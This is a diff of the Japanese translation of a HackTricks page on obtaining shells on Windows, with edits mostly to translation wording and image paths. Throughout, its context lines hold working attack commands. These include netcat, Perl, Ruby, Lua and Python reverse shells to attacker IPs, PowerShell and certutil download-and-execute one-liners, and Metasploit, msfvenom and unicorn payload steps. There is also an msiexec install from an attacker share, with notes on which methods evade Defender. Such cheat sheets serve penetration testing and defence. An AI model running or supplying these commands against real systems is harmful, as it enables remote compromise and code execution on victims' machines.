@@ -16,7 +16,7 @@ HackTricks をサポートする他の方法:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,7 +25,7 @@ HackTricks をサポートする他の方法:
 ## Lolbas
 
 ページ [lolbas-project.github.io](https://lolbas-project.github.io/) は、Linux用の [https://gtfobins.github.io/](https://gtfobins.github.io/) と同様に、Windows用です。\
-明らかに、**WindowsにはSUIDファイルやsudo権限はありません**が、**いくつかのバイナリ**が（悪用されて）**任意のコードを実行する**など、予期しないアクションを実行する方法を知っていると便利です。
+明らかに、**WindowsにはSUIDファイルやsudo権限はありません**が、いくつかの **バイナリ** が **任意のコードを実行する**などの予期しないアクションを実行する方法を知っていると便利です。
 
 ## NC
 ```bash
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/)は、携帯可能で安全なNetcatの代替です**。Unix系システムとWin32で動作します。強力な暗号化、プログラムの実行、カスタマイズ可能なソースポート、継続的な再接続などの機能を備えており、TCP/IP通信の多目的なソリューションを提供します。Windowsユーザーにとって、Kali Linuxディストリビューションからのsbd.exeバージョンは、Netcatの信頼性のある代替として使用できます。
+**[sbd](https://www.kali.org/tools/sbd/)は、携帯可能で安全なNetcatの代替です**。UnixライクなシステムとWin32で動作します。強力な暗号化、プログラムの実行、カスタマイズ可能なソースポート、継続的な再接続などの機能を備えており、TCP/IP通信のための多目的なソリューションを提供します。Windowsユーザーにとって、Kali Linuxディストリビューションからのsbd.exeバージョンは、Netcatの信頼性のある代替として使用できます。
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -54,7 +54,7 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perlは、Windowsシステムで使用される多目的スクリプト言語です。Perlスクリプトは、Windowsシェルで実行されることができ、システム管理やネットワークスクリプティングなどの用途に適しています。Perlは、Windowsシステムでの侵入テストやネットワークセキュリティの向上に役立つ可能性があります。
+Perlは、Windowsシステムで使用されることが多いスクリプト言語です。Perlスクリプトを使用して、Windowsシステムでのシェルアクセスを確立することができます。Perlスクリプトを使用すると、Windowsシステムでの様々な操作を自動化することが可能です。
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -66,7 +66,7 @@ ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.pope
 ```
 ## Lua
 
-Lua
+Luaは、スクリプト言語であり、多くのプラットフォームで使用されています。Luaは、高い拡張性と柔軟性を持ち、組み込みシステムから大規模なアプリケーションまで幅広い用途に使用されています。Luaは、シンプルで直感的な構文を持ち、C言語との統合も容易です。Luaスクリプトは、さまざまな用途に使用され、特にゲーム開発やウェブ開発などの分野で人気があります。Luaは、多くのオープンソースプロジェクトで広く採用されており、コミュニティによって活発にサポートされています。
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -88,7 +88,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 ```
 ## Powershell
 
-PowerShellは、Windowsシステムで広く使用されているスクリプト言語およびシェルフレームワークです。PowerShellを使用すると、システム管理者は効率的にタスクを自動化し、スクリプトを作成して実行することができます。PowerShellは、Windowsの機能を活用してシステムに対する深い制御を提供します。
+PowerShellは、Windowsシステムで広く使用されているスクリプト言語およびシェルフレームワークです。 PowerShellを使用すると、システム管理者は自動化されたタスクやスクリプトを作成し、Windowsシステム上での様々な操作を効率的に実行できます。 PowerShellは、Windowsの機能を活用してシステムに対する深い制御を提供します。
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -131,7 +131,7 @@ mshta \\webdavserver\folder\payload.hta
 
 #### htaの例
 
-[**こちらから**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+[**ここから**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
 <html>
 <head>
@@ -166,7 +166,7 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Mshta - Metasploit**
 
-Mshta is a tool in Metasploit that allows execution of HTA (HTML Application) files. It can be used to run malicious scripts in memory without touching the disk, making it a stealthy way to execute code on a target system.
+Mshta is a tool in Metasploit that allows execution of HTA (HTML Application) files. It can be used to run malicious scripts on a target system.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -260,8 +260,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Regsvr32 - Metasploit**
-
-Regsvr32 is a legitimate Windows program used to register and unregister OLE controls like DLLs and ActiveX controls in the Windows Registry. However, it can also be abused by attackers to execute malicious scripts. Metasploit provides a payload called `regsvr32` that can be used to execute malicious code on a target system using Regsvr32.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -284,7 +282,7 @@ B64exeをダウンロードし、デコードして実行します。
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Defenderに検出された**
+**Defenderによって検出されました**
 
 
 ## **Cscript/Wscript**
@@ -320,11 +318,11 @@ impacket-smbserver -smb2support kali `pwd`
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-被害者：
+被害者:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**検出**
+**検出されました**
 
 ## **Wmic**
 
@@ -332,7 +330,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-例のxslファイルは[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)から：
+例のxslファイルは[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)からダウンロードできます。
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -369,7 +367,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe s
 ```
 以下から基本的なC#リバースシェルをダウンロードできます：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**検出されていません**
+**検出されない**
 
 ## **Regasm/Regsvc**
 
@@ -397,11 +395,11 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-**Shells** フォルダには、さまざまなシェルがあります。Invoke-_PowerShellTcp.ps1_ をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加します:
+**Shells**フォルダには、さまざまなシェルがあります。**Invoke-_PowerShellTcp.ps1_**をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加します。
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-次の手順でスクリプトをWebサーバーで提供し、被害者の端末で実行します：
+次の手順に従って、スクリプトをWebサーバーで提供し、被害者の端末で実行します：
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -457,16 +455,12 @@ unicornを使用して、metasploitバックドアのPowerShellバージョン�
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
 ```plaintext
-msfconsole -r <resource_file>
-```
-
-```plaintext
 作成したリソースを使用してmsfconsoleを起動します：
 ```
 ```
 msfconsole -r unicorn.rc
 ```
-次のコマンドを使用して、_powershell\_attack.txt_ ファイルを提供するWebサーバーを起動し、被害者のデバイスで実行します：
+以下は、被害者の端末で実行するために、_powershell\_attack.txt_ ファイルを提供するウェブサーバーを起動します:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -474,9 +468,9 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## もっと
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) 暗号化されたいくつかの攻撃的なPSモジュールがプリロードされたPSコンソール\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) 一部の攻撃的なPSモジュールがプリロードされたPSコンソール（暗号化済み）\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) いくつかの攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソール (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) 一部の攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソール（IEX）
 
 ## 参考文献
 
@@ -490,20 +484,20 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) いくつかの攻撃的なPS�
 ​
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>を使用して、ゼロからヒーローまでAWSハッキングを学ぶ</summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>でAWSハッキングをゼロからヒーローまで学ぶ！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricksをサポートする他の方法：
 
 * **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する
-* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有する
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**する。
+* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。
 
 </details>
